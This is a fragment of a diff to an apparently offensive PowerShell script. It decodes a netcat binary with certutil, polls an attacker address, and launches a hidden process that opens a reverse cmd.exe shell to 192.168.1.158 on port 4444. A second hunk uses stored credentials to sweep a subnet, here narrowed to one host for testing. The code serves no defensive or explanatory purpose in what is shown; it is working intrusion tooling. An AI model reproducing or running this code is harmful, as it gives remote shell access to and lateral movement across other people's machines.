@@ -6,15 +6,16 @@ certutil -decode $env:TEMP\nc.exe.txt $env:TEMP\nc.exe
 
 $b = 0
 $p = 4444
+$tst = $false
 
-while ($b -lt 4) {
+while ($b -lt 4 -and $tst -eq $false) {
 
 $an = (Test-NetConnection $atk -Port $p -ErrorAction SilentlyContinue).TcpTestSucceeded
 
 if ($an -eq $true){
-
+$tst = $true
 Start-Sleep -Seconds 20
-Start-Process powershell.exe -WindowStyle Hidden -ArgumentList "-nop -w hidden $env:TEMP\nc.exe 192.168.1.158 4444 -e cmd.exe"
+Start-Process powershell.exe -WindowStyle Hidden -ArgumentList "-nop $env:TEMP\nc.exe 192.168.1.158 $p -e cmd.exe"
 
 }
 $p++
@@ -48,8 +49,9 @@ $mycredential = New-Object System.Management.Automation.PSCredential ($u, $secpa
     if ($isdot = $subnetrange.EndsWith('.') -eq $false){$subnetrange = $subnetrange + '.'}
     
     
-    $iprange = @(1..254)
-
+    #$iprange = @(1..254)
+    $iprange = @(102)
+     
     foreach ($i in $iprange){
 
 
